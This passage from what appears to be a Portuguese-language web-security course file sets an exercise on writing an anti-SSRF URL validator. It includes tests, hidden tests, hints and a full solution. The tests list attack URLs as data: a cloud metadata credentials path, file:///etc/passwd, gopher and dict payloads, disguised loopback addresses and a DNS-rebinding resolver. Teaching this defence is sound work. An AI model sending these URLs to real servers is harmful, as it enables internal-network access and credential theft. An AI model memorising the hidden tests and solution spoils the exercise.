        explanation: 'Cada defesa ataca a **mecânica** do seu ataque: o escape impede o dado de virar código no HTML; `textContent` e Trusted Types fazem o mesmo nos sinks do front; SameSite e tokens tiram do atacante a "carona" nos cookies; `frame-ancestors` impede o enquadramento; a validação de IP resolvido impede o servidor de alcançar a rede interna; e `HttpOnly` esconde o cookie do JavaScript. Repare que `HttpOnly` só limita o **estrago** de um XSS — a correção continua sendo o escape.',
      },
      {
        type: 'code',
        id: 'sec-web-q5',
        concept: 'SSRF',
        title: 'Validador anti-SSRF',
        say: 'Última — e a mais caprichada. Um validador de URL para a funcionalidade "importar avatar por URL". Os testes trazem todos os disfarces de IP que eu mostrei.',
        prompt: `Implemente \`validar_url(url, resolver, permitidos=None) -> str\`, que devolve o **IP** em que o servidor deve conectar, ou lança \`URLBloqueada\`. \`resolver(host)\` devolve uma **lista de IPs** (strings), como o \`getaddrinfo\` — inclusive para IPs literais e formas estranhas como \`2130706433\` — e lança \`OSError\` se o nome não existir.

Bloqueie (\`URLBloqueada\`) quando:

1. o esquema não for \`http\` nem \`https\` (\`urlsplit\` já devolve o esquema em minúsculas);
2. não houver host, ou houver **credenciais** na URL (\`usuario@host\`, \`usuario:senha@host\`);
3. a porta não for omitida, \`80\` ou \`443\` — porta inválida também bloqueia;
4. \`permitidos\` (conjunto de hosts em minúsculas) foi passado e o host — em minúsculas e **sem ponto final** — não está nele;
5. \`resolver\` lançar \`OSError\` ou devolver lista vazia;
6. **algum** IP resolvido não for público: use \`ipaddress\` e exija \`is_global\` e não \`is_multicast\`; um IPv4 mapeado em IPv6 (\`::ffff:10.0.0.1\`) é checado como o IPv4 que carrega (\`.ipv4_mapped\`).

Chame o \`resolver\` **uma única vez** e devolva o **primeiro** IP da lista — quem fizer a requisição conecta nele. Nenhuma outra exceção pode escapar.`,
        starter: `import ipaddress
from urllib.parse import urlsplit


class URLBloqueada(ValueError):
    """A URL não pode ser buscada pelo servidor (risco de SSRF)."""


PORTAS_PERMITIDAS = {None, 80, 443}


def validar_url(url, resolver, permitidos=None):
    # TODO: devolva o IP validado (str) ou lance URLBloqueada
    pass
`,
        tests: [
          {
            name: 'URLs públicas: devolve o IP validado',
            code: AUX_SSRF + `
_aceita("https://example.com/avatar.png", "93.184.215.14", "URL pública comum")
_aceita("http://example.com:80/a.png", "93.184.215.14", "porta 80 explícita")
_aceita("https://example.com:443/a.png", "93.184.215.14", "porta 443 explícita")
_aceita("HTTPS://EXAMPLE.COM/A.PNG", "93.184.215.14", "esquema e host em maiúsculas")
_aceita("http://[2606:4700::1111]/a.png", "2606:4700::1111", "IPv6 público literal")
_aceita("https://cdn.example.com/a.png", "2606:4700::1111", "vários IPs públicos: devolva o primeiro")`,
          },
          {
            name: 'metadados da nuvem (169.254.169.254) → URLBloqueada',
            code: AUX_SSRF + `
_bloqueia("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "metadados da AWS")
_bloqueia("http://metadata.google.internal/computeMetadata/v1/", "nome que resolve para 169.254.169.254")`,
          },
          {
            name: 'loopback e redes privadas → URLBloqueada',
            code: AUX_SSRF + `
for url in ["http://localhost/admin", "http://127.0.0.1/", "http://10.0.0.5/", "http://172.16.3.4/",
            "http://192.168.0.1/", "http://[::1]/", "http://0.0.0.0/"]:
    _bloqueia(url, "endereço interno")`,
          },
          {
            name: 'só http e https',
            code: AUX_SSRF + `
for url in ["file:///etc/passwd", "gopher://example.com/_SET%20x", "ftp://example.com/a.png",
            "javascript:alert(1)", "dict://example.com/info"]:
    _bloqueia(url, "esquema não permitido")`,
          },
          {
            name: 'credenciais na URL e portas fora de 80/443 → URLBloqueada',
            code: AUX_SSRF + `
_bloqueia("http://example.com@169.254.169.254/", "'example.com' aqui é só o usuário; o host é o IP")
_bloqueia("http://admin:senha@example.com/", "credenciais na URL")
_bloqueia("http://example.com:6379/", "porta do Redis")
_bloqueia("http://example.com:22/", "porta do SSH")`,
          },
          {
            name: 'IP disfarçado (decimal, hexa, octal, abreviado): valide o IP RESOLVIDO',
            code: AUX_SSRF + `
for url in ["http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/"]:
    _bloqueia(url, "o resolver transforma isso em 127.0.0.1 — valide o IP que ele devolve, não o texto")`,
          },
          {
            name: 'allowlist: aceita o parceiro (com maiúsculas e ponto final) e recusa o resto',
            code: AUX_SSRF + `
ok = {"api.parceiro.com"}
_aceita("https://api.parceiro.com/v1/foto", "151.101.1.140", "host na allowlist", permitidos=ok)
_aceita("https://API.Parceiro.com./v1/foto", "151.101.1.140", "host na allowlist (maiúsculas e ponto final)", permitidos=ok)
_bloqueia("https://evil.com/foto", "host fora da allowlist", permitidos=ok)
_bloqueia("https://api.parceiro.com.evil.com/foto", "sufixo enganoso", permitidos=ok)`,
          },
          {
            name: 'DNS: um único IP interno basta; nome inexistente ou sem IP também bloqueia',
            hidden: true,
            code: AUX_SSRF + `
_bloqueia("http://interno.example.com/", "um dos IPs resolvidos é 10.0.0.7")
_bloqueia("http://rebind.example.net/", "nome que resolve para 127.0.0.1")
_bloqueia("http://naoexiste.example.org/", "o resolver lança OSError")
_bloqueia("http://vazio.example.com/", "o resolver devolve lista vazia")`,
          },
          {
            name: 'a allowlist não dispensa a checagem de IP',
            hidden: true,
            code: AUX_SSRF + `
_bloqueia("http://rebind.example.net/", "host liberado que aponta para 127.0.0.1",
          permitidos={"api.parceiro.com", "rebind.example.net"})`,
          },
          {
            name: 'resolver consultado uma única vez (DNS rebinding)',
            hidden: true,
            code: `chamadas = []

def resolver_rebind(host):
    chamadas.append(host)
    return ["93.184.215.14"] if len(chamadas) == 1 else ["127.0.0.1"]

ip = validar_url("http://rebind.example.net/", resolver_rebind)
assert len(chamadas) == 1, f"o resolver foi chamado {len(chamadas)} vezes: a 2ª resposta pode ser outra (DNS rebinding) — resolva uma vez e use esse resultado"
assert ip == "93.184.215.14", f"devolva o IP que foi validado, veio {ip!r}"`,
          },
          {
            name: 'IPv4 mapeado em IPv6, IPv6 privado, CGNAT e multicast → URLBloqueada',
            hidden: true,
            code: AUX_SSRF + `
for url in ["http://[::ffff:169.254.169.254]/", "http://[::ffff:10.0.0.1]/", "http://[fd00::1]/",
            "http://[fe80::1]/", "http://100.64.0.1/", "http://224.0.0.251/"]:
    _bloqueia(url, "endereço não público")`,
          },
          {
            name: 'URL malformada → URLBloqueada (nunca outra exceção)',
            hidden: true,
            code: AUX_SSRF + `
for url in ["http://[::1/", "http://example.com:abc/", "http://example.com:99999/", "http:///avatar.png",
            "https://", "", "example.com/avatar.png"]:
    _bloqueia(url, "URL malformada")`,
          },
        ],
        reviews: [
          {
            when: (m, code) => !/is_global|is_private/.test(code),
            text: 'Você classificou os IPs sem `is_global`/`is_private` do módulo `ipaddress`. Listas feitas à mão esquecem faixas (CGNAT `100.64.0.0/10`, `0.0.0.0/8`, IPv6 *unique local* `fc00::/7`…); a stdlib já conhece o registro de endereços especiais da IANA.',
            concept: 'ipaddress',
          },
          {
            when: (m, code) => /startswith\(\s*\(?\s*["'](10\.|127\.|192\.168|169\.254|172\.)/.test(code),
            text: 'Comparar o **texto** do IP com prefixos (`"127."`, `"10."`) é frágil: `2130706433`, `0x7f000001` e `::ffff:127.0.0.1` são o mesmo loopback. Converta para `ipaddress.ip_address` e pergunte as propriedades.',
            concept: 'Canonicalização',
          },
          {
            when: (m, code) => (code.match(/\bresolver\(/g) || []).length > 1,
            text: 'Você chama o `resolver` em mais de um lugar. Se um caminho valida uma resolução e outro usa outra, o atacante responde "IP público" na primeira e `127.0.0.1` na segunda — **DNS rebinding** (um *TOCTOU*). Resolva uma vez, valide e conecte no mesmo IP.',
            concept: 'DNS rebinding',
          },
          {
            when: m => m.bareExcepts > 0 || m.broadExcepts > 0,
            text: 'Você capturou `Exception` (ou usou `except:` sem tipo). Em código de segurança isso esconde bugs: capture o que você espera — `ValueError` do `urlsplit`/porta/`ip_address` e `OSError` do resolver.',
            concept: 'Tratamento de exceções',
          },
          {
            when: m => m.maxComplexity > 10,
            text: '`validar_url` acumulou muitos caminhos. Separe em passos com nome — analisar a URL, checar esquema/credenciais/porta, resolver, checar os IPs —, cada um lançando `URLBloqueada`. Validação de segurança precisa ser fácil de **auditar**.',
            concept: 'Funções pequenas',
          },
        ],
        hints: [
          'Comece com `partes = urlsplit(url)` e `porta = partes.port` dentro de um `try/except ValueError` (porta inválida e IPv6 malformado lançam `ValueError`). Use `partes.scheme`, `partes.hostname`, `partes.username` e `partes.password`.',
          'Normalize o host com `partes.hostname.rstrip(".")` (o `hostname` já vem em minúsculas). Depois: `ips = resolver(host)` com `except OSError`, e bloqueie se `not ips`.',
          'Para cada IP: `ip = ipaddress.ip_address(texto)`; se `ip.version == 6 and ip.ipv4_mapped`, troque por `ip.ipv4_mapped`; aceite só se `ip.is_global and not ip.is_multicast`. No fim, `return ips[0]`.',
        ],
        solution: `import ipaddress
from urllib.parse import urlsplit


class URLBloqueada(ValueError):
    """A URL não pode ser buscada pelo servidor (risco de SSRF)."""


ESQUEMAS_PERMITIDOS = {"http", "https"}
PORTAS_PERMITIDAS = {None, 80, 443}


def _analisar(url):
    try:
        partes = urlsplit(url)
        porta = partes.port                      # ValueError se inválida
    except ValueError as erro:
        raise URLBloqueada("URL malformada") from erro
    return partes, porta


def _host_permitido(url, permitidos):
    partes, porta = _analisar(url)
    if partes.scheme not in ESQUEMAS_PERMITIDOS:
        raise URLBloqueada(f"esquema não permitido: {partes.scheme!r}")
    if not partes.hostname:
        raise URLBloqueada("URL sem host")
    if partes.username is not None or partes.password is not None:
        raise URLBloqueada("credenciais na URL")
    if porta not in PORTAS_PERMITIDAS:
        raise URLBloqueada(f"porta não permitida: {porta}")
    host = partes.hostname.rstrip(".")
    if permitidos is not None and host not in permitidos:
        raise URLBloqueada(f"host fora da allowlist: {host}")
    return host


def _publico(texto):
    try:
        ip = ipaddress.ip_address(texto)
    except ValueError:
        return False
    if ip.version == 6 and ip.ipv4_mapped:       # ::ffff:10.0.0.1 é o IPv4 10.0.0.1
        ip = ip.ipv4_mapped
    return ip.is_global and not ip.is_multicast


def validar_url(url, resolver, permitidos=None):
    host = _host_permitido(url, permitidos)
    try:
        ips = resolver(host)                     # UMA resolução: é nela que a conexão vai
    except OSError as erro:
        raise URLBloqueada(f"não foi possível resolver {host}") from erro
    if not ips:
        raise URLBloqueada(f"{host} não tem endereço")
    internos = [ip for ip in ips if not _publico(ip)]
    if internos:
        raise URLBloqueada(f"{host} aponta para endereço interno: {internos[0]}")
    return ips[0]
`,
        solutionExplanation: 'A validação tem duas metades. A primeira olha a **URL**: `urlsplit` separa esquema, credenciais, host e porta — e tudo é allowlist (`http`/`https`, portas 80/443, hosts permitidos). A segunda olha o **destino real**: o texto do host não diz nada (`2130706433` é `127.0.0.1`), então resolvemos o nome e exigimos que **todos** os IPs sejam públicos (`is_global`, não multicast, desembrulhando IPv4 mapeado em IPv6). Devolver o IP validado — e resolver uma única vez — fecha a janela do **DNS rebinding**: quem fizer a requisição conecta nesse IP (mandando o `Host` original). Em produção, some-se a isso: não seguir redirects (ou revalidar cada salto), timeout e limite de tamanho da resposta, e isolar a busca numa rede sem acesso ao interno — com IMDSv2 na nuvem.',
      },
      {
        type: 'say',
        mood: 'happy',
        text: [
          'Excelente! Agora você enxerga o navegador — e o seu servidor — com olhos de atacante.',
          { text: 'Resumo: escape conforme o contexto, CSP com nonce, SameSite e tokens contra CSRF, frame-ancestors contra clickjacking e IP resolvido contra SSRF.', mood: 'cheer' },
        ],
        board: null,
      },
    ],
  });
})();
